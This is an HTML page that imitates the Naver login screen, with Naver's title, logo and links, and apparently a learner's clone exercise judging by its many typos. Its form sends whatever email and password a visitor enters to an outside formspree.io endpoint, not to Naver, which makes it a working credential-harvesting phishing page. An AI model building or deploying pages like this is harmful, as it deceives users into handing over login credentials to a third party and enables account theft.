<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="css/style.css">
  <title>네이버 로그인</title>
</head>
<body>
  <div class="container">
    <header class="header">
      <h1 class="header__logo">
        <a href="https://www.naver.com" target="_blank" rel="noopener norefer">
          <img src="./images/logo.png" alt="NAVER" srcset="./images/logo.svg">
        </a>
      </h1>
    </header>
    <main class="main">
      <h2 class="a11yHidden">로그인</h2>
      <form action="https://formspree.io/f/mrgrplje" method="POST" class="loginForm">
        <fieldset>
          <legend>로그인폼</legend>
          <div class="loginForm__contaier">
            <div class="userEmail">
              <div class="formCotrol">
                <label for="userEmail" class="a11yHidden formControl__label">아이디</label>
                <input class="formCotrol__input" type="email" id="userEmail" name="userEmail" required placeholder="아이디">
              </div>
              <span class="reeoeMessage">아이디는 이메일 형식이어야 합니다.</span>
            </div>
            <div class="userpassword">
              <div class="formCotrol">
                <label for="userpassword" class="a11yHidden formControl__label">비밀번호</label>
                <input class="formCotrol__input" type="password" id="userpassword" name="userpassword" required placeholder="비밀번호">
              </div>
              <span class="errorMessage">비밀번호를 입력해주세요.</span>
            </div>
            <div class="userSelectInfo">
              <div class="formCotrol loginState">
                <input type="checkbox" class="formeControl_checkbox" name="loginSrate" id="loginState">
                <label for="loginState" slass="formControl_label">
                  <span class="checkboxIn"></span>
                  로그인 상태유지
                </label>
              </div>
              <a href="https://www.naver.com" class="ipSequirtyLink" target="_blank" rel="noreferrer noopener">IP보안</a>
              <div class="formControl ipSequirty"> 
                <input type="checkbox" class="formeControl_checkbox" name="ipSequirty" id="ipSequirty">
                <label for="ipSequirty" class="formeControl_label" name="ipSequirty_label" ></label>
              </div>
              <div class="formControl">
                <button type="submit" class="formControl_button buttonLogin">로그인</button>
              </div>
            </div>
          </div>
        </fieldset>
      </form>
    </main>
    <footer class="footer a11yHidden"></footer>
  </div>

</body>
</html>
